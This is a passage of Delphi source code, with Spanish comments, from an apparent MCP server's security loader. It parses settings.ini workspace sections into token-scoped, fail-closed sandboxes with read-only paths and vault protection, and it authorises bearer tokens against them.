  if HasActiveWS then
    Exit(ActiveWS.OvSharedFolders); // ausente = ninguna
  Result := GSharedFolders;
end;

{ 1 / 0 when the key is present in the section, -1 (inherit) when absent. }
function ReadTriState(AIni: TIniFile; const ASection, AKey: string): Integer;
begin
  if not AIni.ValueExists(ASection, AKey) then
    Exit(-1);
  if AIni.ReadBool(ASection, AKey, False) then
    Result := 1
  else
    Result := 0;
end;

procedure SetRequestWorkspace(AIx: Integer);
begin
  TRequestWorkspaceIx1 := AIx + 1;
end;

function SettingsIniPath: string;
begin
  Result := ServerDir('settings.ini');
end;

function CurrentWorkspaceName: string;
begin
  if HasActiveWS then
    Result := ActiveWS.Name
  else
    Result := '';
end;

function WorkspaceTokensConfigured: Boolean;
var
  W: TWorkspaceDef;
begin
  for W in GWorkspaces do
    if (W.Token <> '') or (W.ReadOnlyToken <> '') then
      Exit(True);
  Result := False;
end;

function WorkspaceStartupNotes: TArray<string>;
var
  Names: string;
  W: TWorkspaceDef;
begin
  Result := [];
  Names := '';
  for W in GWorkspaces do
  begin
    if Names <> '' then
      Names := Names + ', ';
    Names := Names + W.Name;
  end;
  if Names <> '' then
    Result := Result + ['Workspaces: ' + Names];
  Result := Result + GWorkspaceNotes;
end;

function AuthorizeBearer(const AAuth: string; out AReadOnly: Boolean;
  out AWorkspaceIx: Integer): Boolean;
var
  I: Integer;
begin
  AReadOnly := False;
  AWorkspaceIx := -1;
  // O WORKSPACE O NADA (v0.91; rematado 2026-09-19): un Bearer autentica
  // SOLO contra un [Workspace.<nombre>]. Sin coincidencia, 401 - ya no hay
  // modo abierto "sin configurar" ni anonimo de solo lectura. El modo de
  // confianza queda para el proceso LOCAL (stdio) que lanza el operador.
  // workspace tokens: the secret decides the jail, not the declared name
  for I := 0 to High(GWorkspaces) do
  begin
    // fail closed: a workspace without a valid jail admits nobody
    if GWorkspaces[I].Invalid or (Length(GWorkspaces[I].Roots) = 0) then
      Continue;
    // el esquema sin distinguir mayusculas y el token si (BearerToken):
    // "bearer <token>" daba 401 (decima revision)
    if (GWorkspaces[I].Token <> '') and
       (BearerToken(AAuth) = GWorkspaces[I].Token) then
    begin
      AWorkspaceIx := I;
      Exit(True);
    end;
    if (GWorkspaces[I].ReadOnlyToken <> '') and
       (BearerToken(AAuth) = GWorkspaces[I].ReadOnlyToken) then
    begin
      AWorkspaceIx := I;
      AReadOnly := True;
      Exit(True);
    end;
  end;
  Result := False;
end;

procedure SetProcessReadOnly(AValue: Boolean);
begin
  GProcessReadOnly := AValue;
end;

procedure SetRequestReadOnly(AValue: Boolean);
begin
  GRequestReadOnly := AValue;
end;

function IsReadOnlyNow: Boolean;
begin
  // (el token de lectura del ENTORNO ata al cliente LOCAL, el que no trae
  // workspace en su peticion. Ponia el proceso entero en solo lectura, y un
  // servidor HTTP con esa variable en su entorno negaba la escritura tambien
  // a quien entraba con el token de escritura de su workspace - medido en la
  // revision de la 1.9.0)
  Result := GProcessReadOnly or GRequestReadOnly or
    (GStdioSoloLectura and (TRequestWorkspaceIx1 = 0));
  if not Result then
    // Excepcion local sin token, SOLO LECTURA (David 2026-09-19, "menos
    // sustos"): sin workspace activo y sin jaula declarada en el entorno
    // se puede MIRAR todo el codigo pero no tocar nada. Solo alcanzable en
    // stdio: todo HTTP entra con token de workspace o recibe 401 antes.
    Result := (TWorkspaceIx1 = 0) and (Length(WorkspaceRoots) = 0);
end;

procedure ParseAdbDevices(const ARaw: string);
var
  E: string;
begin
  if ARaw.Trim = '' then
    Exit;
  for E in ARaw.Split([';']) do
    if E.Trim <> '' then
      GAdbDevices := GAdbDevices + [E.Trim];
end;

{ Un copia-pega futuro puede dejar el MISMO token en dos [Workspace.*], la
  misma clave dos veces en una seccion, o la misma seccion dos veces. TIniFile
  no avisa de nada de eso: coge lo primero y calla, y un agente entra en una
  jaula que no es la suya sin que nadie lo vea. Los workspaces afectados se
  CIERRAN (fail closed, el mismo Invalid que unas Roots que no parsean) y el
  arranque lo dice (David, 2026-09-23). }
procedure ComprobarDuplicadosIni(const AIniPath: string);
var
  I, J, P: Integer;
  Lineas: TArray<string>;
  Seccion, T, Clave: string;
  Claves, Secciones: TStringList;

  procedure Cierra(const ANombre: string);
  var
    K: Integer;
  begin
    for K := 0 to High(GWorkspaces) do
      if SameText(GWorkspaces[K].Name, ANombre) then
        GWorkspaces[K].Invalid := True;
  end;

  function Comparten(const A, B: TWorkspaceDef): Boolean;
  begin
    Result := ((A.Token <> '') and ((A.Token = B.Token) or (A.Token = B.ReadOnlyToken))) or
      ((A.ReadOnlyToken <> '') and ((A.ReadOnlyToken = B.Token) or (A.ReadOnlyToken = B.ReadOnlyToken)));
  end;

begin
  // 1. el mismo secreto en dos workspaces, o Token = ReadOnlyToken en uno
  for I := 0 to High(GWorkspaces) do
  begin
    if (GWorkspaces[I].Token <> '') and (GWorkspaces[I].Token = GWorkspaces[I].ReadOnlyToken) then
    begin
      GWorkspaces[I].Invalid := True;
      GWorkspaceNotes := GWorkspaceNotes +
        [MsgFmt(SL_GUARD_MISMO_VALOR_TOKEN_FMT, [GWorkspaces[I].Name])];
    end;
    for J := I + 1 to High(GWorkspaces) do
      if Comparten(GWorkspaces[I], GWorkspaces[J]) then
      begin
        GWorkspaces[I].Invalid := True;
        GWorkspaces[J].Invalid := True;
        GWorkspaceNotes := GWorkspaceNotes +
          [MsgFmt(SL_GUARD_COMPARTEN_UN_TOKEN_FMT, [GWorkspaces[I].Name,
           GWorkspaces[J].Name])];
      end;
  end;
  // 2. la misma clave dos veces en una seccion, o la misma seccion dos veces
  try
    Lineas := TFile.ReadAllLines(AIniPath);
  except
    Exit;
  end;
  Claves := TStringList.Create;
  Secciones := TStringList.Create;
  try
    Claves.CaseSensitive := False;
    Secciones.CaseSensitive := False;
    Seccion := '';
    for var L in Lineas do
    begin
      T := L.Trim;
      if (T = '') or T.StartsWith(';') or T.StartsWith('#') then
        Continue;
      if T.StartsWith('[') and T.EndsWith(']') then
      begin
        Seccion := T.Substring(1, T.Length - 2).Trim;
        if Secciones.IndexOf(Seccion) >= 0 then
        begin
          if Seccion.StartsWith('Workspace.', True) then
          begin
            Cierra(Seccion.Substring(Length('Workspace.')));
            GWorkspaceNotes := GWorkspaceNotes +
              [MsgFmt(SL_GUARD_SECCION_DOS_VECES_CERRADO_FMT, [Seccion])];
          end
          else
          begin
            GWorkspaceNotes := GWorkspaceNotes +
              [MsgFmt(SL_GUARD_SECCION_DOS_VECES_FUSIONALAS_FMT, [Seccion])];
            // lo del segundo no lo ve Windows: la clave no se escribe encima
            if SameText(Seccion, 'Server') then
              GServerIniDoble := True;
          end;
        end
        else
          Secciones.Add(Seccion);
        Continue;
      end;
      P := T.IndexOf('=');
      if P <= 0 then
        Continue;
      Clave := Seccion + '|' + T.Substring(0, P).Trim;
      if Claves.IndexOf(Clave) >= 0 then
      begin
        if Seccion.StartsWith('Workspace.', True) then
        begin
          Cierra(Seccion.Substring(Length('Workspace.')));
          GWorkspaceNotes := GWorkspaceNotes +
            [MsgFmt(SL_GUARD_REPITE_CLAVE_CERRADO_FMT, [Seccion, T.Substring(0, P).Trim])];
        end
        else
        begin
          GWorkspaceNotes := GWorkspaceNotes +
            [MsgFmt(SL_GUARD_REPITE_CLAVE_IGNORA_FMT, [Seccion, T.Substring(0, P).Trim])];
          if SameText(Clave, 'Server|DelphiVersion') then
            GServerIniDoble := True;
        end;
      end
      else
        Claves.Add(Clave);
    end;
  finally
    Claves.Free;
    Secciones.Free;
  end;
end;

{ Las entradas que un lector dejo fuera (no son una ruta con letra, o no
  parsean), dichas en el arranque: donde estaban (la clave) y cual era. Vacia
  la lista y devuelve si habia alguna.
  AProtege: la clave dice lo que NO se escribe (ReadOnlyRoots, ReadOnlyPaths,
  VaultPath). Una raiz que no se carga cierra; una proteccion que no se carga
  ABRE - lo que nombraba podria escribirse -, asi que quien la declara queda
  CERRADO (fail closed), y el aviso lo dice. }
function AvisaDeSitiosNoCargados(const ADonde: string; AProtege: Boolean;
  var AFuera: TArray<string>): Boolean;
var
  S, Msg: string;
begin
  Result := Length(AFuera) > 0;
  if AProtege then
    Msg := SL_GUARD_PROTECCION_NO_CARGADA_FMT
  else
    Msg := SL_GUARD_SITIO_NO_CARGADO_FMT;
  for S in AFuera do
    GWorkspaceNotes := GWorkspaceNotes + [MsgFmt(Msg, [ADonde, S])];
  AFuera := nil;
end;

{ Las entradas de ReadOnlyPaths que caen FUERA de todas las raices de su
  workspace y de sus referencias, dichas en el arranque. ReadOnlyPaths marca
  de solo lectura lo que ya esta DENTRO de la jaula: una carpeta de fuera ni
  la abre ni la protege para sus agentes, y quien la escribe queria casi
  siempre ReadOnlyRoots (medido 2-oct-2026: dos workspaces de la VM con
  ReadOnlyPaths=L:\... para leer codigo de fuera, y ninguno lo leia). Se
  carga igual: sigue entre lo que no se toca de NINGUN workspace
  (SitiosQueNoSeTocan). Sin raices no hay "fuera": el modo local de
  confianza lee toda la maquina, y un workspace sin raices ya esta cerrado.
  AClaveDeFuera: la que si abre para leer, como se llama alli (ReadOnlyRoots
  en el ini, DELPHI_MCP_READONLY_ROOTS en el entorno). Primera revision de
  la 1.9.1: una entrada que CONTIENE una raiz la deja entera de solo lectura.
  Correccion medida el 4-oct: cuenta el texto con sus alias 8.3 Y la ruta
  real; que la raiz sea un junction no quita la proteccion de su entrada. }
function EnLugar(const APath, ALugar: string;
  AResuelveAlias: Boolean = True): Boolean; forward;

procedure AvisaDeSoloLecturaFuera(const ADonde, AClaveDeFuera: string;
  const APaths, ARoots, AReferencias: TArray<string>);

  // La ruta REAL en una unidad LOCAL, como la jaula (un junction cuenta, y
  // un nombre 8.3 tambien); en otra - de red, o una que el proceso aun no ve -
  // el TEXTO: por una letra de red el arranque no sale a la red (lo que la
  // toca va despues, con su plazo: VigilaLetrasDeRed). Un enlace simbolico de
  // una unidad local a un recurso de red se sigue, como lo sigue la jaula en
  // cada peticion (segunda revision de la 1.9.1).
  function Comparable(const ASitio: string): string;
  begin
    Result := IncludeTrailingPathDelimiter(ASitio);
    if ClaseDeLetra(LetraDeRuta(ASitio)) = clLocal then
    try
      Result := IncludeTrailingPathDelimiter(RealPath(SinBarraFinal(ASitio)));
    except
      // la que no se resuelve se compara por el texto
    end;
  end;

var
  P, PC, R, RC: string;
  Dentro, AliasLocal: Boolean;
  Dichas: TArray<string>;
begin
  if Length(ARoots) = 0 then
    Exit;
  Dichas := nil;
  for P in APaths do
  begin
    PC := Comparable(P);
    Dentro := False;
    // Una entrada que contiene la raiz por texto protege su descendencia.
    // Una entrada dentro de la raiz que SALE por un enlace sigue siendo fuera.
    // El arranque solo resuelve alias en unidades locales: no abre la red.
    for R in ARoots do
    begin
      RC := Comparable(R);
      AliasLocal := (ClaseDeLetra(LetraDeRuta(P)) = clLocal) and
        (ClaseDeLetra(LetraDeRuta(R)) = clLocal);
      if EnLugar(R, P, AliasLocal) or
         EnLugar(PC, RC, False) or EnLugar(RC, PC, False) then
      begin
        Dentro := True;
        Break;
      end;
    end;
    // dentro de una referencia propia: lo que quien la escribe queria leer
    // ya se lee
    if not Dentro then
      for R in AReferencias do
      begin
        if EnLugar(PC, Comparable(R), False) then
        begin
          Dentro := True;
          Break;
        end;
      end;
    // (una relativa que sale al mismo sitio desde dos raices, una vez)
    if not Dentro and (IndexText(PC, Dichas) < 0) then
    begin
      Dichas := Dichas + [PC];
      GWorkspaceNotes := GWorkspaceNotes + [MsgFmt(SL_GUARD_SOLO_LECTURA_FUERA_FMT,
        [ADonde, SinBarraFinal(P), AClaveDeFuera])];
    end;
  end;
end;

{ Un VaultPath= con texto que no vale como sitio: completo, no es una ruta
  con letra, o no parsea. El vault es un sitio protegido - las tools de
  codigo no entran en el -: lleva la regla de los demas (David, 1-oct-2026). }
function VaultSinLetra(const ACrudo: string): Boolean;
var
  V: string;
begin
  V := ACrudo.Trim.Trim(['"']).Trim;
  if V = '' then
    Exit(False);
  if not EntradaDeSitio(V, False) then
    Exit(True);
  V := VaultNormalizado(ACrudo);
  Result := (V = '') or not EsSitioConLetra(IncludeTrailingPathDelimiter(V));
end;

{ La forma de un update: numero, punto, numero ('13.2'). }
function EsFormaDeUpdate(const S: string): Boolean;
var
  Partes: TArray<string>;
begin
  Partes := S.Split(['.']);
  if Length(Partes) <> 2 then
    Exit(False);
  for var P in Partes do
  begin
    if P = '' then
      Exit(False);
    for var C in P do
      if not CharInSet(C, ['0'..'9']) then
        Exit(False);
  end;
  Result := True;
end;

{ La linea (1-based) donde un BOM de UTF-8 va delante de la cabecera de una
  seccion, o 0. La API de los ini de Windows toma el BOM por texto de esa
  linea: no ve la cabecera y pierde la seccion entera (medido el 6-oct-2026
  con un [Server] primero: el servidor en el 3000 y en todas las
  interfaces). Al principio del fichero, que es lo normal, y tambien a mitad
  - un trozo pegado de otro fichero - o dos seguidos. Lo pregunta
  LoadSecurity ANTES de leer nada (revision del 6-oct-2026: estaba en Wire,
  despues de que el ini se hubiera leido y usado). }
function LineaConBomAntesDeSeccion(const AIniPath: string): Integer;
var
  B: TArray<Byte>;
  I, J, Linea: Integer;
  ConBom: Boolean;
begin
  Result := 0;
  try
    B := TFile.ReadAllBytes(AIniPath);
  except
    Exit; // sin poder leerlo no se sabe: que lo lea TIniFile, como siempre
  end;
  I := 0;
  Linea := 1;
  while I < Length(B) do
  begin
    // un principio de linea: los BOM que haya, los blancos, y si sigue '['
    J := I;
    ConBom := False;
    while BomUtf8En(B, J) do
    begin
      ConBom := True;
      Inc(J, 3);
    end;
    if ConBom then
    begin
      while (J < Length(B)) and ((B[J] = Ord(' ')) or (B[J] = 9)) do
        Inc(J);
      if (J < Length(B)) and (B[J] = Ord('[')) then
        Exit(Linea);
    end;
    while (I < Length(B)) and (B[I] <> 10) do
      Inc(I);
    Inc(I);
    Inc(Linea);
  end;
end;

procedure LoadSecurity;
var
  IniPath: string;
  Ini: TIniFile;
  Fuera: TArray<string>;
  LineaBom: Integer;
begin
  if GSecLoaded then
    Exit;
  ParseAdbDevices(GetEnvironmentVariable('DELPHI_MCP_ADB_DEVICES'));
  GAuthToken := GetEnvironmentVariable('DELPHI_MCP_TOKEN');
  GReadOnlyToken := GetEnvironmentVariable('DELPHI_MCP_READONLY_TOKEN');
  GAllowRemoteRun := GetEnvironmentVariable('DELPHI_MCP_ALLOW_REMOTE_RUN') = '1';
  GLibraryZone := GetEnvironmentVariable('DELPHI_MCP_LIBRARY_ZONE') <> '0';
  GAllowTests := GetEnvironmentVariable('DELPHI_MCP_ALLOW_TESTS') = '1';
  GGitRemotes := GetEnvironmentVariable('DELPHI_MCP_GIT_REMOTES');
  GRemoteHosts := GetEnvironmentVariable('DELPHI_MCP_REMOTE_HOSTS');
  GRemoteProjects := GetEnvironmentVariable('DELPHI_MCP_REMOTE_RUN_PROJECTS')
    .Split([';'], TStringSplitOptions.ExcludeEmpty);
  GVaultPath := GetEnvironmentVariable('DELPHI_MCP_VAULT_PATH');
  GAllowBuildScripts := GetEnvironmentVariable('DELPHI_MCP_ALLOW_BUILD_SCRIPTS') = '1';
  GAgentConfinement := GetEnvironmentVariable('DELPHI_MCP_AGENT_CONFINEMENT') = '1';
  GToolsProfile := LowerCase(GetEnvironmentVariable('DELPHI_MCP_TOOLS_PROFILE').Trim);
  if GToolsProfile = '' then
    GToolsProfile := 'full';
  GToolsOnly := LowerCase(GetEnvironmentVariable('DELPHI_MCP_TOOLS_ONLY'))
    .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
  GSharedFolders := LowerCase(GetEnvironmentVariable('DELPHI_MCP_SHARED_FOLDERS'))
    .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
  // Las claves de JAULA del modo local, aqui con las demas: hasta el
  // 25-sep-2026 Roots, ReadOnlyPaths, ReadOnlyRoots y VaultReadOnly se
  // leian cada una en su primer uso, con su propia cache - cuatro
  // cargadores mas que este, y cuatro sitios donde olvidar una mitad.
  var RawRootsEnv := GetEnvironmentVariable('DELPHI_MCP_ROOTS');
  Fuera := nil;
  GRoots := ParseRootsList(RawRootsEnv, Fuera);
  AvisaDeSitiosNoCargados('DELPHI_MCP_ROOTS', False, Fuera);
  // Fail CLOSED: Roots con texto pero nada parseado = nada permitido.
  GRootsInvalid := (RawRootsEnv.Trim <> '') and (Length(GRoots) = 0);
  // ...y una PROTECCION del entorno que no se cargo cierra el modo local,
  // con su motivo (GLocalCerrado): dejarla fuera sin mas abria lo que nombraba
  GRoPaths := ParseReadOnlyList(GetEnvironmentVariable('DELPHI_MCP_READONLY_PATHS'), GRoots, Fuera);
  if AvisaDeSitiosNoCargados('DELPHI_MCP_READONLY_PATHS', True, Fuera) then
    GLocalCerrado := MsgText(SF_CIERRE_PROTECCION);
  GRoRoots := ParseRootsList(GetEnvironmentVariable('DELPHI_MCP_READONLY_ROOTS'), Fuera);
  if AvisaDeSitiosNoCargados('DELPHI_MCP_READONLY_ROOTS', True, Fuera) then
    GLocalCerrado := MsgText(SF_CIERRE_PROTECCION);
  AvisaDeSoloLecturaFuera('DELPHI_MCP_READONLY_PATHS', 'DELPHI_MCP_READONLY_ROOTS',
    GRoPaths, GRoots, GRoRoots);
  if VaultSinLetra(GVaultPath) then
  begin
    Fuera := [GVaultPath.Trim];
    AvisaDeSitiosNoCargados('DELPHI_MCP_VAULT_PATH', True, Fuera);
    GVaultPath := '';
    GLocalCerrado := MsgText(SF_CIERRE_PROTECCION);
  end;
  // El entorno gana en AMBOS sentidos para el vault del modo local (las
  // baterias fuerzan un vault de solo lectura por encima de cualquier ini).
  GVaultEnvWritable := GetEnvironmentVariable('DELPHI_MCP_VAULT_READONLY') = '0';
  IniPath := SettingsIniPath;
  // un BOM de UTF-8 delante de una seccion: Windows la pierde entera, y nada
  // de lo que se leyera seria lo que escribio el operador. No se lee, y el
  // servidor no arranca (ExigeSettingsIniLegible, desde TMcpHost.Wire)
  LineaBom := 0;
  if TFile.Exists(IniPath) then
    LineaBom := LineaConBomAntesDeSeccion(IniPath);
  if LineaBom > 0 then
    GIniIlegible := MsgFmt(SE_GUARD_INI_BOM_FMT, [IniPath, LineaBom]);
  if TFile.Exists(IniPath) and (LineaBom = 0) then
  begin
    // la fecha ANTES de leerlo: si lo tocan mientras, se avisa de mas, nunca de menos
    GIniCargadoEn := TFile.GetLastWriteTime(IniPath);
    Ini := TIniFile.Create(IniPath);
    try
      // v0.98 (David): el ini NO tiene seccion generica - todo permiso
      // vive en un [Workspace.<nombre>]; el modo local de lanzamiento se
      // define SOLO por el entorno de quien arranca el proceso. Del ini,
      // fuera de los workspaces, solo queda fontaneria ([Server]/[Tools]).
      if GToolsProfile = 'full' then
        GToolsProfile := LowerCase(Ini.ReadString('Tools', 'Profile', 'full').Trim);
      if Length(GToolsOnly) = 0 then
        GToolsOnly := LowerCase(Ini.ReadString('Tools', 'Only', ''))
          .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
      // La fontaneria de [Server] y [Log], aqui con las demas: hasta el
      // 26-sep BindIP, SessionTimeoutMinutes y el [Log] de la bandeja
      // abrian el fichero cada uno por su cuenta (tres lectores mas).
      GIniBindIP := Ini.ReadString('Server', 'BindIP', '');
      GIniSessionTimeout := Ini.ReadString('Server', 'SessionTimeoutMinutes', '').Trim;
      GIniEngineIdle := Ini.ReadString('Server', 'EngineIdleMinutes', '').Trim;
      GIniMaxEngines := Ini.ReadString('Server', 'MaxEngines', '').Trim;
      // de aqui y de ningun otro sitio: sin variable de entorno (David)
      GDelphiVersion := Ini.ReadString('Server', 'DelphiVersion', '').Trim;
      // el update lo declara el operador (13.2); otra forma se avisa y se
      // ignora, como si no estuviera
      GDelphiUpdate := Ini.ReadString('Server', 'DelphiUpdate', '').Trim;
      if (GDelphiUpdate <> '') and not EsFormaDeUpdate(GDelphiUpdate) then
      begin
        GWorkspaceNotes := GWorkspaceNotes +
          [MsgFmt(SL_GUARD_DELPHIUPDATE_MAL_FMT, [GDelphiUpdate])];
        GDelphiUpdate := '';
      end;
      GIniLogLines := Ini.ReadInteger('Log', 'LinesPerFile', 2000);
      GIniLogMaxFiles := Ini.ReadInteger('Log', 'MaxFiles', 10);
      // [Workspace.<name>] sections: token-scoped sandboxes. Parsed once,
      // here, so AuthorizeBearer never touches the disk per request.
      var Secs := TStringList.Create;
      try
        Ini.ReadSections(Secs);
        for var S in Secs do
          if S.StartsWith('Workspace.', True) and (S.Length > Length('Workspace.')) then
          begin
            var W: TWorkspaceDef;
            W.Name := S.Substring(Length('Workspace.')).Trim;
            W.Token := Ini.ReadString(S, 'Token', '').Trim;
            // Everyone had typed AuthToken= for years, so the
            // hand writes it again inside a workspace (measured: the operator
            // himself, 2026-09-10, and the server swallowed it silently).
            // Token= is canonical; AuthToken= works as an alias.
            if W.Token = '' then
              W.Token := Ini.ReadString(S, 'AuthToken', '').Trim;
            W.ReadOnlyToken := Ini.ReadString(S, 'ReadOnlyToken', '').Trim;
            W.Profile := LowerCase(Ini.ReadString(S, 'Profile', '').Trim);
            var RawRoots := Ini.ReadString(S, 'Roots', '');
            W.Roots := ParseRootsList(RawRoots, Fuera);
            AvisaDeSitiosNoCargados('[' + S + '] Roots=', False, Fuera);
            W.ReadOnlyPaths := ParseReadOnlyList(
              Ini.ReadString(S, 'ReadOnlyPaths', ''), W.Roots, Fuera);
            var SinProteccion := AvisaDeSitiosNoCargados('[' + S + '] ReadOnlyPaths=', True, Fuera);
            // Mismo lector que Roots: son raices, solo que de lectura.
            W.ReadOnlyRoots := ParseRootsList(Ini.ReadString(S, 'ReadOnlyRoots', ''), Fuera);
            if AvisaDeSitiosNoCargados('[' + S + '] ReadOnlyRoots=', True, Fuera) then
              SinProteccion := True;
            W.Invalid := (RawRoots.Trim <> '') and (Length(W.Roots) = 0);
            // capability overrides; absent key = inherit the default
            W.OvAllowTests := ReadTriState(Ini, S, 'AllowTests');
            W.OvAllowRemoteRun := ReadTriState(Ini, S, 'AllowRemoteRun');
            W.OvAllowBuildScripts := ReadTriState(Ini, S, 'AllowBuildScripts');
            W.OvLibraryZone := ReadTriState(Ini, S, 'LibraryZone');
            W.OvAgentConfinement := ReadTriState(Ini, S, 'AgentConfinement');
            W.GitRemotes := Ini.ReadString(S, 'GitRemotes', '').Trim;
            W.RemoteHosts := Ini.ReadString(S, 'RemoteHosts', '').Trim;
            W.RemoteProjects := Ini.ReadString(S, 'RemoteRunProjects', '')
              .Split([';'], TStringSplitOptions.ExcludeEmpty);
            W.VaultPath := Ini.ReadString(S, 'VaultPath', '').Trim;
            if VaultSinLetra(W.VaultPath) then
            begin
              Fuera := [W.VaultPath];
              AvisaDeSitiosNoCargados('[' + S + '] VaultPath=', True, Fuera);
              W.VaultPath := '';
              SinProteccion := True;
            end;
            W.OvVaultReadOnly := ReadTriState(Ini, S, 'VaultReadOnly');
            W.AdbDevices := Ini.ReadString(S, 'AdbAllowedDevices', '')
              .Split([';'], TStringSplitOptions.ExcludeEmpty);
            W.OvSharedSet := Ini.ValueExists(S, 'SharedFolders');
            if W.OvSharedSet then
              W.OvSharedFolders := LowerCase(Ini.ReadString(S, 'SharedFolders', ''))
                .Split([',', ';'], TStringSplitOptions.ExcludeEmpty);
            if W.Invalid then
              GWorkspaceNotes := GWorkspaceNotes +
                [MsgFmt(SL_GUARD_ROOTS_NO_PARSEA_FMT, [W.Name])];
            // (una proteccion que no se cargo: cerrado, y ya dicho en su aviso)
            if SinProteccion then
              W.Invalid := True;
            if (W.Token <> '') or (W.ReadOnlyToken <> '') then
            begin
              // (de una seccion sin token, que se ignora entera, no se dice)
              AvisaDeSoloLecturaFuera('[' + S + '] ReadOnlyPaths=', 'ReadOnlyRoots',
                W.ReadOnlyPaths, W.Roots, W.ReadOnlyRoots);
              // La version es del SERVIDOR desde el 5-oct-2026: la de un
              // workspace ya no se lee, y se dice en vez de callarlo.
              // Y quien la tenia queria una: la mas nueva no se fija en
              // [Server] por el (David, 6-oct-2026)
              if Ini.ValueExists(S, 'DelphiVersion') then
              begin
                GWorkspaceNotes := GWorkspaceNotes +
                  [MsgFmt(SL_GUARD_DELPHIVERSION_EN_WORKSPACE_FMT, [W.Name])];
                GWorkspaceConDelphiVersion := W.Name;
              end;
              GWorkspaces := GWorkspaces + [W];
            end
            else
              GWorkspaceNotes := GWorkspaceNotes +
                [MsgFmt(SL_GUARD_SIN_TOKEN_IGNORADA_FMT, [W.Name])];
          end
          else if SameText(S, 'Workspace') then
            // [Workspace] without the dot is the v0.97 section, and it was
            // EXEMPTED from the warning below - so it was the one spelling
            // that vanished in total silence. Worse: until 2026-09-20 our
            // own refusals sent the operator to edit exactly that section,
            // in 21 user-facing strings ("settings.ini [Workspace] Roots"),
            // two of them shipped inside tools/list. Somebody following our
            // own instructions got no jail, no token, and not one word
            // anywhere saying why. It gets the loudest note of the three.
            GWorkspaceNotes := GWorkspaceNotes +
              [MsgText(SL_GUARD_WORKSPACE_SIN_PUNTO)]
          else if S.ToLower.StartsWith('work') then
            // [Workopenclaw], [WorkspaceX]... a workspace section spelled
            // wrong used to vanish silently and its token answered 401 with
            // no clue anywhere (measured 2026-09-10). Name the fix.
            GWorkspaceNotes := GWorkspaceNotes +
              [MsgFmt(SL_GUARD_WORKSPACE_MAL_ESCRITO_FMT, [S])];
      finally
        Secs.Free;
      end;
    finally
      Ini.Free;
    end;
    ComprobarDuplicadosIni(IniPath);
  end;
  // O TOKEN O NADA tambien para el cliente local con credencial: si el
  // entorno trae DELPHI_MCP_TOKEN (o DELPHI_MCP_READONLY_TOKEN, en solo
  // lectura) y coincide con un workspace, el proceso stdio queda ligado a
  // ESA jaula, exactamente como un Bearer en HTTP (David, 2026-09-19).
  // Sin coincidencia no abre nada: el par de entorno sigue inerte.
  // ...salvo que coincida con un workspace CERRADO (sin jaula valida): ese
  // proceso no admite nada. Se saltaba el workspace y quedaba el modo local
  // de confianza - sin DELPHI_MCP_ROOTS, toda la maquina en solo lectura -
  // para un cliente al que su operador habia puesto una jaula (revision de la
  // 1.9.0: con la regla de la letra, un workspace que ayer valia hoy cierra).
  for var K := 0 to High(GWorkspaces) do
  begin
    var EsSuToken := (GAuthToken <> '') and (GWorkspaces[K].Token <> '') and
      (GAuthToken = GWorkspaces[K].Token);
    // (de solo lectura: su token de lectura en cualquiera de las dos
    // variables - en DELPHI_MCP_TOKEN no ataba nada y quedaba el modo local,
    // que sin DELPHI_MCP_ROOTS lee toda la maquina -, o su token de escritura
    // puesto en la de solo lectura: como el Bearer de HTTP, el secreto dice
    // el workspace. Tercera revision de la 1.9.0)
    var EsSuLector := ((GWorkspaces[K].ReadOnlyToken <> '') and
      ((GReadOnlyToken = GWorkspaces[K].ReadOnlyToken) or
       (GAuthToken = GWorkspaces[K].ReadOnlyToken))) or
      ((GWorkspaces[K].Token <> '') and (GReadOnlyToken = GWorkspaces[K].Token));
    if not (EsSuToken or EsSuLector) then
      Continue;
    if GWorkspaces[K].Invalid or (Length(GWorkspaces[K].Roots) = 0) then
    begin
      GLocalCerrado := MsgFmt(SF_CIERRE_WORKSPACE_FMT, [GWorkspaces[K].Name]);
      Continue;
    end;
    GStdioIx1 := K + 1;
    if not EsSuToken then
      GStdioSoloLectura := True;
    Break;
  end;
  // El modo local CERRADO no tiene raices: lo que las recorre sin pasar por
  // la jaula (delphi_projects sin root) no tiene que encontrar nada, igual
  // que con unas Roots invalidas (segunda revision de la 1.9.0). Con un
  // workspace atado por su token, las del entorno no se usan.
  if (GLocalCerrado <> '') and (GStdioIx1 = 0) then
  begin
    GRoots := nil;
    GRoPaths := nil;
    GRoRoots := nil;
  end;
  // Las letras de RED de los sitios declarados (Lsp.NetDrives): la que este
  // proceso no ve - un servicio no ve las del escritorio - se conecta desde
  // el mapeo persistente de la cuenta, y se comprueba que se entra a lo
  // declarado: raices, referencias y vaults. Aqui, con todo cargado y antes
  // de que nadie use una raiz; lo que pasa sale con las notas de arranque, y
  // lo que llegue despues (pasado el plazo, o al reintentar), al log. Un
  // workspace cerrado no cuenta: no admite a nadie.
  var Sitios: TArray<string> := GRoots + GRoRoots;
  if VaultNormalizado(GVaultPath) <> '' then
    Sitios := Sitios + [IncludeTrailingPathDelimiter(VaultNormalizado(GVaultPath))];
  for var K := 0 to High(GWorkspaces) do
    if not GWorkspaces[K].Invalid then
    begin
      Sitios := Sitios + GWorkspaces[K].Roots + GWorkspaces[K].ReadOnlyRoots;
      if VaultNormalizado(GWorkspaces[K].VaultPath) <> '' then
        Sitios := Sitios + [IncludeTrailingPathDelimiter(
          VaultNormalizado(GWorkspaces[K].VaultPath))];
    end;
  try
    GWorkspaceNotes := GWorkspaceNotes + VigilaLetrasDeRed(Sitios, ManosDeWindows,
      PLAZO_LETRAS_DE_RED_MS, REINTENTO_LETRAS_DE_RED_MS, NotaAlLog);
  except
    // (no poder lanzar el hilo no deja la carga a medias: GSecLoaded se
    // quedaba a False y la siguiente llamada cargaba los workspaces otra vez)
    on E: Exception do
      GWorkspaceNotes := GWorkspaceNotes +
        [MsgFmt(SL_NET_REVISION_FALLO_FMT, [E.ClassName, E.Message])];
  end;
  GSecLoaded := True;
end;

procedure LogIniSettings(out ALinesPerFile, AMaxFiles: Integer);
begin
  LoadSecurity;
  ALinesPerFile := GIniLogLines;
  AMaxFiles := GIniLogMaxFiles;
  // un ini que no se lee no poda la historia del log: sus [Log] no se han
  // leido y el servidor no va a arrancar (revision del 6-oct-2026)
  if GIniIlegible <> '' then
    AMaxFiles := MaxInt;
end;

function AuthToken: string;
begin
  LoadSecurity;
  Result := GAuthToken;
end;

function ReadOnlyToken: string;
begin
  LoadSecurity;
  Result := GReadOnlyToken;
end;

function AllowRemoteRun: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
